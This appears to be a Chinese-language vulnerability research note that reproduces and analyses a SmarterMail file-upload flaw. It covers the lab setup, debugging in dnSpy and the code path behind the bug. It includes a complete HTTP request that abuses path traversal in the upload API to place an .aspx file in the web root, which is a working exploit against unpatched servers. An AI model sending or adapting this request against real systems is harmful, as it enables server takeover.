# CVE-2025-2025-52691-SmarterMail-Exp
# 环境搭建

```
SmarterMail 9400
https://downloads.smartertools.com/smartermail/100.0.9400/SmarterMail_9400.exe

chrome
https://www.google.com/chrome/dev/

winserver 2016
ed2k://|file|cn_windows_server_2016_x64_dvd_9718765.iso|6176450560|CF1B73D220F1160DE850D9E1979DBD50|/

dnspyEx
https://github.com/dnSpyEx/dnSpy/releases

findeverthing
https://www.voidtools.com/zh-cn/support/everything/
```

安装过程就是默认安装，没什么说的，中间会要求配置一个域名，我配的是 `yun.cn`

在 `hosts`文件中加上对应的配置

![image-20260110024514605](F:\书籍\笔记\临时笔记\漏洞分析\SmarterMail.assets\image-20260110024514605.png)

![image-20260110024449410](F:\书籍\笔记\临时笔记\漏洞分析\SmarterMail.assets\image-20260110024449410.png)

![image-20260110024636264](F:\书籍\笔记\临时笔记\漏洞分析\SmarterMail.assets\image-20260110024636264.png)

# 漏洞复现

要使用配置的域名访问，使用IP不行

![image-20260110025249395](F:\书籍\笔记\临时笔记\漏洞分析\SmarterMail.assets\image-20260110025249395.png)

```http
POST /api/upload HTTP/1.1
Host: yun.cn:9998
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 6185

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="context"

attachment
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="resumableIdentifier"

fakeID
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="resumableFilename"

fakefile.aspx
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="contextData"

{"guid":"dag/../../../../../../../inetpub/wwwroot/D7zC1a"}
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="whatever"; filename="fake.jpg"

【你上传的文件内容】
------WebKitFormBoundary7MA4YWxkTrZu0gW--

```

![image-20260110025328273](F:\书籍\笔记\临时笔记\漏洞分析\SmarterMail.assets\image-20260110025328273-17679848084191.png)

# 漏洞分析

找到 `MailSerivce.dll`拖到 `dnspyEx`

![image-20260110025729539](F:\书籍\笔记\临时笔记\漏洞分析\SmarterMail.assets\image-20260110025729539.png)

找到 `SmartMail.Web.Api`命名空间

![image-20260110025825807](F:\书籍\笔记\临时笔记\漏洞分析\SmarterMail.assets\image-20260110025825807.png)

里面有个 `FileUploadController`类，可以看到对应的路由是 `api/upload`和exp中的路由对应

![image-20260110025944266](F:\书籍\笔记\临时笔记\漏洞分析\SmarterMail.assets\image-20260110025944266.png)

![image-20260110030029776](F:\书籍\笔记\临时笔记\漏洞分析\SmarterMail.assets\image-20260110030029776.png)

![image-20260110030320023](F:\书籍\笔记\临时笔记\漏洞分析\SmarterMail.assets\image-20260110030320023.png)

进行动态调试

![image-20260110030503936](F:\书籍\笔记\临时笔记\漏洞分析\SmarterMail.assets\image-20260110030503936.png)

![image-20260110030519946](F:\书籍\笔记\临时笔记\漏洞分析\SmarterMail.assets\image-20260110030519946-17679855200793.png)

在对应代码打上断点

![image-20260110030547813](F:\书籍\笔记\临时笔记\漏洞分析\SmarterMail.assets\image-20260110030547813.png)

再次发送payload时需要修改 `resumableFilename`的值，只要和之前用的不同就行

![image-20260110030657701](F:\书籍\笔记\临时笔记\漏洞分析\SmarterMail.assets\image-20260110030657701.png)

成功断点

![image-20260110030725195](F:\书籍\笔记\临时笔记\漏洞分析\SmarterMail.assets\image-20260110030725195.png)





请求包里 `context`值是 `attachment` 应该是走这个分支

![image-20260110031110752](F:\书籍\笔记\临时笔记\漏洞分析\SmarterMail.assets\image-20260110031110752.png)

![image-20260110031119402](F:\书籍\笔记\临时笔记\漏洞分析\SmarterMail.assets\image-20260110031119402.png)

下个断点跳过来

![image-20260110031212197](F:\书籍\笔记\临时笔记\漏洞分析\SmarterMail.assets\image-20260110031212197.png)



检查文件的后缀名

![image-20260110024514605](F:\书籍\笔记\临时笔记\漏洞分析\SmarterMail.assets\image-20260110024514605.png)

其中 `configuration.FileName`其实就是请求包中 `resumableFilename`的值

![image-20260110031533363](F:\书籍\笔记\临时笔记\漏洞分析\SmarterMail.assets\image-20260110031533363.png)

![image-20260110031620847](F:\书籍\笔记\临时笔记\漏洞分析\SmarterMail.assets\image-20260110031620847.png)

但是这里后缀黑名单的 `list`是空的

![image-20260110031928922](F:\书籍\笔记\临时笔记\漏洞分析\SmarterMail.assets\image-20260110031928922.png)

分段上传，会先产生一个临时文件，保存分段上传的内容

![image-20260110032318681](F:\书籍\笔记\临时笔记\漏洞分析\SmarterMail.assets\image-20260110032318681.png)

![image-20260110032335113](F:\书籍\笔记\临时笔记\漏洞分析\SmarterMail.assets\image-20260110032335113.png)

然后在 `TryAssembleFile`函数，尝试合并分段上传的文件，并删除临时文件

![image-20260110032749749](F:\书籍\笔记\临时笔记\漏洞分析\SmarterMail.assets\image-20260110032749749.png)

最后在 `ProcessCompletedUploaded`函数完成最后的目录穿越

![image-20260110034718376](F:\书籍\笔记\临时笔记\漏洞分析\SmarterMail.assets\image-20260110034718376.png)

